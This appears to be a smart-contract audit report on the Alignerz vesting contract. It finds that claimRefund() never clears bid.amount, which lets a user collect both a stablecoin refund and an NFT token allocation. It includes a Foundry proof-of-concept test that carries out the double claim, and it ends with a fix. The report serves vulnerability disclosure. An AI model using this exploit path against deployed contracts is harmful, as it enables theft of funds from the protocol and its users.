# [000703] Attacker will double-claim both refund and NFT allocation causing fund loss to protocol and other users
  
  ### Summary

The `claimRefund()` function does not clear `bid.amount` after processing a refund, which will cause a double-claim vulnerability for the protocol as an attacker with valid proofs in both refund and allocation merkle trees can claim their stablecoin refund AND receive an NFT allocation, effectively stealing funds.


### Root Cause

In [AlignerzVesting.sol:835-853](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L835-L853) the `claimRefund()` function does not clear `bid.amount` after successfully processing a refund. Both `claimRefund()` and `claimNFT()` use `require(bid.amount > 0, No_Bid_Found())` as a gate check, but since neither function clears this value, a user with valid merkle proofs in both trees can call both functions.

```solidity
function claimRefund(uint256 projectId, uint256 amount, bytes32[] calldata merkleProof) external {
    BiddingProject storage biddingProject = biddingProjects[projectId];
    require(biddingProject.claimDeadline > block.timestamp, Deadline_Has_Passed());

    Bid storage bid = biddingProject.bids[msg.sender];
    require(bid.amount > 0, No_Bid_Found());  // @audit checked but never cleared

    uint256 poolId = 0;
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, amount, projectId, poolId));
    require(!claimedRefund[leaf], Already_Claimed());
    require(MerkleProof.verify(merkleProof, biddingProject.refundRoot, leaf), Invalid_Merkle_Proof());
    claimedRefund[leaf] = true;

    biddingProject.totalStablecoinBalance -= amount;
    biddingProject.stablecoin.safeTransfer(msg.sender, amount);

    emit BidRefunded(projectId, msg.sender, amount);
    // @audit bid.amount is NEVER cleared - allows claimNFT() to still pass
}
```

### Internal Pre-conditions

1. A bidding project needs to be created and finalized with both `refundRoot` and pool `merkleRoot` set
2. User needs to have placed a bid with `bid.amount > 0`
3. Claim deadline needs to not have passed


### External Pre-conditions

1. Backend (which generates merkle proofs) needs to generate proofs for the same user in BOTH the refund merkle tree AND the allocation merkle tree. This can happen due to:
   - Backend bug in proof generation logic
   - Backend compromise
   - Race condition in backend processing


### Attack Path

1. Attacker places a bid by calling `placeBid()` with some stablecoin amount
2. Project owner finalizes the project by calling `finalizeBids()` with merkle roots
3. Due to backend bug/compromise, attacker has valid proofs in both `refundRoot` and `vestingPools[poolId].merkleRoot`
4. Attacker calls `claimRefund()` with their refund proof - receives stablecoin back, but `bid.amount` remains unchanged
5. Attacker calls `claimNFT()` with their allocation proof - passes the `bid.amount > 0` check since it was never cleared, receives NFT with token allocation
6. Attacker waits for vesting period and calls `claimTokens()` to receive vested tokens
7. Attacker has now received both their stablecoin refund AND the vested token allocation


### Impact

The protocol and other users suffer fund loss. The attacker gains:
- 100% of their original stablecoin bid amount (via refund)
- 100% of their token allocation (via NFT claim and vesting)

This effectively allows the attacker to participate in the token sale for free, stealing tokens that should have been distributed to legitimate participants. If the contract has insufficient tokens to cover all legitimate claims after the attack, other users will be unable to claim their rightful allocations.

### PoC

Save this POC to : `protocol/test/L01_BidStateNotClearedAfterRefund.t.sol`

Run with:
```bash
forge t --mp test/L01_BidStateNotClearedAfterRefund.t.sol -vv
```

### POC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";

contract L01_BidStateNotClearedAfterRefundTest is Test {
    AlignerzVesting public vesting;
    Aligners26 public token;
    AlignerzNFT public nft;
    MockUSD public usdt;

    address public owner;
    address public projectCreator;
    address public attacker;
    address public victim;
    address public dummyUser;

    uint256 constant TOKEN_AMOUNT = 10_000_000 ether;
    uint256 constant BID_AMOUNT = 1000e6;
    uint256 constant PROJECT_ID = 0;
    uint256 constant POOL_ID = 0;

    function setUp() public {
        owner = address(this);
        projectCreator = makeAddr("projectCreator");
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        dummyUser = makeAddr("dummyUser");

        vm.deal(projectCreator, 100 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);

        usdt = new MockUSD();
        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        AlignerzVesting impl = new AlignerzVesting();
        bytes memory initData = abi.encodeCall(AlignerzVesting.initialize, (address(nft)));
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        vesting = AlignerzVesting(payable(address(proxy)));

        vm.prank(owner);
        nft.addMinter(address(vesting));
        vesting.setTreasury(makeAddr("treasury"));

        token.transfer(projectCreator, TOKEN_AMOUNT);
        vesting.transferOwnership(projectCreator);

        vm.prank(projectCreator);
        token.approve(address(vesting), TOKEN_AMOUNT);

        usdt.mint(attacker, BID_AMOUNT * 2);
        usdt.mint(victim, BID_AMOUNT);
    }

    function getLeaf(
        address user,
        uint256 amount,
        uint256 projectId,
        uint256 poolId
    ) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(user, amount, projectId, poolId));
    }

    function test_BidStateNotClearedAfterRefund_DoubleClaim() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            bytes32(0),
            true
        );

        vesting.createPool(PROJECT_ID, 5_000_000 ether, 0.01 ether, true);

        address[] memory whitelist = new address[](2);
        whitelist[0] = attacker;
        whitelist[1] = victim;
        vesting.addUsersToWhitelist(whitelist, PROJECT_ID);
        vm.stopPrank();

        vm.startPrank(attacker);
        usdt.approve(address(vesting), BID_AMOUNT);
        vesting.placeBid(PROJECT_ID, BID_AMOUNT, 90 days);
        vm.stopPrank();

        vm.startPrank(victim);
        usdt.approve(address(vesting), BID_AMOUNT);
        vesting.placeBid(PROJECT_ID, BID_AMOUNT, 90 days);
        vm.stopPrank();

        CompleteMerkle merkle = new CompleteMerkle();

        bytes32[] memory allocationLeaves = new bytes32[](2);
        allocationLeaves[0] = getLeaf(attacker, BID_AMOUNT, PROJECT_ID, POOL_ID);
        allocationLeaves[1] = getLeaf(victim, BID_AMOUNT, PROJECT_ID, POOL_ID);
        bytes32 allocationRoot = merkle.getRoot(allocationLeaves);
        bytes32[] memory attackerAllocationProof = merkle.getProof(allocationLeaves, 0);

        bytes32[] memory refundLeaves = new bytes32[](2);
        refundLeaves[0] = getLeaf(attacker, BID_AMOUNT, PROJECT_ID, 0);
        refundLeaves[1] = getLeaf(dummyUser, 1, PROJECT_ID, 0);
        bytes32 refundRoot = merkle.getRoot(refundLeaves);
        bytes32[] memory attackerRefundProof = merkle.getProof(refundLeaves, 0);

        bytes32[] memory poolRoots = new bytes32[](1);
        poolRoots[0] = allocationRoot;

        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 1 days);

        uint256 attackerUsdtBefore = usdt.balanceOf(attacker);

        vm.prank(attacker);
        vesting.claimRefund(PROJECT_ID, BID_AMOUNT, attackerRefundProof);

        uint256 attackerUsdtAfterRefund = usdt.balanceOf(attacker);
        assertEq(
            attackerUsdtAfterRefund - attackerUsdtBefore,
            BID_AMOUNT,
            "Attacker should receive refund"
        );

        vm.prank(attacker);
        uint256 nftId = vesting.claimNFT(
            PROJECT_ID,
            POOL_ID,
            BID_AMOUNT,
            attackerAllocationProof
        );

        assertEq(nft.ownerOf(nftId), attacker, "Attacker should own NFT");

        vm.warp(block.timestamp + 90 days + 1);

        uint256 attackerTokensBefore = token.balanceOf(attacker);
        vm.prank(attacker);
        vesting.claimTokens(PROJECT_ID, nftId);
        uint256 attackerTokensAfter = token.balanceOf(attacker);

        assertGt(
            attackerTokensAfter,
            attackerTokensBefore,
            "Attacker should receive vested tokens"
        );

        assertEq(
            usdt.balanceOf(attacker),
            BID_AMOUNT * 2,
            "Attacker has original USDT + refund"
        );
        assertGt(
            token.balanceOf(attacker),
            0,
            "Attacker also has vested tokens from allocation"
        );
    }
}

```

### Mitigation

Clear the bid state after a successful refund claim:

```solidity
function claimRefund(uint256 projectId, uint256 amount, bytes32[] calldata merkleProof) external {
    BiddingProject storage biddingProject = biddingProjects[projectId];
    require(biddingProject.claimDeadline > block.timestamp, Deadline_Has_Passed());

    Bid storage bid = biddingProject.bids[msg.sender];
    require(bid.amount > 0, No_Bid_Found());

    uint256 poolId = 0;
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, amount, projectId, poolId));
    require(!claimedRefund[leaf], Already_Claimed());
    require(MerkleProof.verify(merkleProof, biddingProject.refundRoot, leaf), Invalid_Merkle_Proof());
    claimedRefund[leaf] = true;

    biddingProject.totalStablecoinBalance -= amount;
    biddingProject.stablecoin.safeTransfer(msg.sender, amount);

    // Clear the bid state to prevent double-claiming
    delete biddingProject.bids[msg.sender];

    emit BidRefunded(projectId, msg.sender, amount);
}
```
  